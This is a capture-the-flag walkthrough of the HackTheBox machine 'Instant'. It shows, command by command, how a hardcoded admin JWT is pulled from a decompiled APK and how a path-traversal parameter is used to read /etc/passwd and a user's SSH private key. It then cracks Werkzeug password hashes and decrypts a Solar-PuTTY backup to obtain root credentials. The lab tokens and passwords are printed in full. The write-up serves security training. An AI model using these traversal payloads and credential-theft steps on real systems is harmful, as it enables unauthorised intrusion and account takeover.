# Instant HackTheBox WalkThrough

![card](../../img/Instant/Instant.png)

We begin by scanning the entire range of TCP ports on the target machine.

```
nmap -sS -p- -Pn -n --min-rate 5000 10.129.109.123

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-16 10:38 CET
Nmap scan report for 10.129.109.123
Host is up (0.044s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 15.53 seconds
```

The machine has two open ports: `22` (commonly SSH) and `80` (HTTP). Let’s confirm their services with a more detailed scan.

```
nmap -sVC -p 22,80 10.129.109.123 -oN nmap/services

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-16 10:47 CET
Nmap scan report for 10.129.109.123
Host is up (0.046s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA)
|_  256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://instant.htb/
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: Host: instant.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.49 seconds
```

Indeed, the services running are `HTTP` and `SSH`.

Accessing the HTTP service shows a redirect error: `Did not follow redirect to http://instant.htb/`. This happens because the domain instant.htb is not recognized by our machine. We add it to `/etc/hosts` to resolve it locally:

```
echo '10.129.109.123  instant.htb' >> /etc/hosts
```

Once done the basic `reconnaissance`, we will visit the website.

![website](../../img/Instant/website.png)

Visiting the site reveals the main page with a `DOWNLOAD NOW` button to download an Android `APK` file.

We decompile the APK for analysis.

```
apktool d instant.apk -o instant-apk
```

Checking network_security_config.xml in the decompiled APK reveals two subdomains that we will include in the `/etc/hosts`.

```
cat res/xml/network_security_config.xml
```

```xml
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <domain-config cleartextTrafficPermitted="true">
        <domain includeSubdomains="true">mywalletv1.instant.htb</domain>
        <domain includeSubdomains="true">swagger-ui.instant.htb</domain>
    </domain-config>
</network-security-config>
```

```
echo '10.129.109.123  mywalletv1.instant.htb swagger-ui.instant.htb' >> /etc/hosts
```

The `mywalletv1.instant.htb` subdomain returns a 404 error.

![mywalletv1](../../img/Instant/mywalletv1-subdomain.png)

The `swagger-ui.instant.htb` displays an API guide. Testing the API with curl we realise that we are not allowed to make requests to the api.

![swagger](../../img/Instant/swagger-ui.png)

```
curl -sX GET http://swagger-ui.instant.htb/api/v1/admin/list/users | jq
```

```json
{
  "Description": "Unauthorized!",
  "Status": 401
}
```

Authentication is required, so we can do nothing with this for the moment.

Searching the APK code for credentials leads to the decompiled file `AdminActivities.smali`, which contains a JWT token.

```
cat smali/com/instantlabs/instant/AdminActivities.smali
```

```smali
    const-string v2, "Authorization"

    const-string v3, "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"

    .line 25
    invoke-virtual {v1, v2, v3}, Lokhttp3/Request$Builder;->addHeader(Ljava/lang/String;Ljava/lang/String;)Lokhttp3/Request$Builder;
```

We will now try to use the `JWT` as the authorization for the `api`.

```
curl -sX GET -H 'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA' http://swagger-ui.instant.htb/api/v1/admin/list/users | jq
```

```json
{
  "Status": 200,
  "Users": [
    {
      "email": "admin@instant.htb",
      "role": "Admin",
      "secret_pin": 87348,
      "status": "active",
      "username": "instantAdmin",
      "wallet_id": "f0eca6e5-783a-471d-9d8f-0162cbc900db"
    },
    {
      "email": "shirohige@instant.htb",
      "role": "instantian",
      "secret_pin": 42845,
      "status": "active",
      "username": "shirohige",
      "wallet_id": "458715c9-b15e-467b-8a3d-97bc3fcf3c11"
    }
  ]
}
```

It worked. Since in "users" don't find anything interesting, we will try to read the "logs".

```
curl -sX GET -H 'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA' "http://swagger-ui.instant.htb/api/v1/admin/view/logs" | jq
```

```json
{
  "Files": [
    "1.log"
  ],
  "Path": "/home/shirohige/logs/",
  "Status": 201
}
```

There is a `1.log` file. They are located in `/home/shirohige/logs/`. Let's read that file.

```
curl -sX GET -H 'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA' "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=1.log" | jq
```

```json
{
  "/home/shirohige/logs/1.log": [
    "This is a sample log testing\n"
  ],
  "Status": 201
}
```

There is nothing interesting in this log. However, this "input" semms that can be vulnerable to **path traversal**. To check this, we will read the `etc/passwd`.

```
curl -sX GET -H 'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA' "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=../../../etc/passwd" | jq -r '."/home/shirohige/logs/../../../etc/passwd"[]' | tr -s '\n'

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
usbmux:x:103:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
shirohige:x:1001:1002:White Beard:/home/shirohige:/bin/bash
_laurel:x:999:990::/var/log/laurel:/bin/false
```

It is vulnerable. To transform this to a remote command execution we could try to read the ssh private key to connect to the machine without credentials.

```
curl -sX GET -H 'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA' "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=../.ssh/id_rsa" | jq -r '."/home/shirohige/logs/../.ssh/id_rsa"[]' | tr -s '\n' > id_rsa_shirohige

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEApbntlalmnZWcTVZ0skIN2+Ppqr4xjYgIrZyZzd9YtJGuv/w3GW8B
nwQ1vzh3BDyxhL3WLA3jPnkbB8j4luRrOfHNjK8lGefOMYtY/T5hE0VeHv73uEOA/BoeaH

...etc...

HwDs1CAcoWDnh7yhGK6lZM3950r1A/RPwt9FcvWfEoQqwvCV37L7YJJ7rDWlTa06qHMRMP
5VNy/4CNnMdXALx0OMVNNoY1wPTAb0x/Pgvm24KcQn/7WCms865is11BwYYPaig5F5Zo1r
bhd6Uh7ofGRW/5AAAAEXNoaXJvaGlnZUBpbnN0YW50AQ==
-----END OPENSSH PRIVATE KEY-----
```

We give it the proper permissions.

```
chmod 600 id_rsa_shirohige
```

And connect to the machine.

```
ssh shirohige@instant.htb -i id_rsa_shirohige

shirohige@instant:~$
```

We now can read the user flag.

```
cd
cat user.txt
```

In the home directory of the user, we have found a database in sqlite.

```
cd projects/mywallet/Instant-Api/mywallet/instance/
ls

instant.db
```

Lets look for credentials or something to use to escalate privileges in this databse.

```
sqlite3 instant.db
```

Show the tables.

```
sqlite> .tables
wallet_transactions  wallet_users         wallet_wallets
```

Get the users and hashed passwords.

```
sqlite> select username, password from wallet_users;

instantAdmin|pbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978
shirohige|pbkdf2:sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a28272c550ed
```

The hashes seem to be using Werkzeug. To crack them we will use a toll called `Werkzeug-Cracker`.

```
git clone https://github.com/AnataarXVI/Werkzeug-Cracker
```

Create a virtual environment and install the script dependencies.

```
python3 -m venv venv
source venv/bin/activate
pip3 install -r requirements.txt
```

We will write both hashes in different files in order to crack them.

```
echo 'pbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978' > hash.txt
echo 'pbkdf2:sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a28272c550ed' > hash2.txt
```

Try to crack the first one.

```
python werkzeug_cracker.py -p hash.txt -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou-25.txt
Cracking pbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978 |████████████████████████████████| 929/929
```

We have not found the password with this wordlist. Let's try with the second one.

```
python werkzeug_cracker.py -p hash2.txt -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou-25.txt
Cracking pbkdf2:sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a28272c550ed |████                            | 113/929
Password found: estrella
```

The unhashed password is "estrella". Let's try to log in as root with this password.

```
su root
Password: estrella

su: Authentication failure
```

It have not worked, however we will write down this password for the future.

Inspectnig the `/opt` directory we find a `sessions-backup.dat` file.

```
ls /opt/backups/Solar-PuTTY

sessions-backup.dat
```

This file is a backup of a `Solar-Putty` session, which usually contains credentials.

To decrypt this file we will use `SolarPuttyDecrypt`, that only works in windows.

First we clone it in out linux machine.

```
git clone https://github.com/VoidSec/SolarPuttyDecrypt
cd SolarPuttyDecrypt_v1
```

Start a `HTTP` server with python.

```
python3 -m http.server 80
```

Y lo descargamos en una máquina virtual de windows (tanto el script como el archivo `.dat`).

And download it in a windows virtual machine (both the script and the `.dat` file).

![python server dat](../../img/Instant/python-server-dat.png)

We can now execute `SolarPuttyDecrypt.exe` with the file `sessions-backup.dat` as first argument and the decrypt password as the second one.

We will try the password we found previously cracking the hashes `estrella`.

```
C:\Users\delo\Desktop\SolarPuttyDecrypt_v1>.\SolarPuttyDecrypt.exe sessions-backup.dat estrella
```

```json
{
  "Sessions": [
    {
      "Id": "066894ee-635c-4578-86d0-d36d4838115b",
      "Ip": "10.10.11.37",
      "Port": 22,
      "ConnectionType": 1,
      "SessionName": "Instant",
      "Authentication": 0,
      "CredentialsID": "452ed919-530e-419b-b721-da76cbe8ed04",
      "AuthenticateScript": "00000000-0000-0000-0000-000000000000",
      "LastTimeOpen": "0001-01-01T00:00:00",
      "OpenCounter": 1,
      "SerialLine": null,
      "Speed": 0,
      "Color": "#FF176998",
      "TelnetConnectionWaitSeconds": 1,
      "LoggingEnabled": false,
      "RemoteDirectory": ""
    }
  ],
  "Credentials": [
    {
      "Id": "452ed919-530e-419b-b721-da76cbe8ed04",
      "CredentialsName": "instant-root",
      "Username": "root",
      "Password": "12**24nzC!r0c%q12",
      "PrivateKeyPath": "",
      "Passphrase": "",
      "PrivateKeyContent": null
    }
  ],
  "AuthScript": [],
  "Groups": [],
  "Tunnels": [],
  "LogsFolderDestination": "C:\\ProgramData\\SolarWinds\\Logs\\Solar-PuTTY\\SessionLogs"
}
```

In the decrypted file we find a field `"Username": "root"` and `"Password": "12**24nzC!r0c%q12"`. We will try to authenticate in the machine with this credentials.

```
su root
Password: 12**24nzC!r0c%q12
```

We now can read the `root` flag and finish the machine.

```
cd
cat root.txt
```

After finishing the machine, don’t forget to remove the line from `/etc/hosts` corresponding to the machine to avoid accumulating lines with each machine you do.

If you found this useful, consider giving a star to the project. Thank you, and good luck with your future machines ❤️.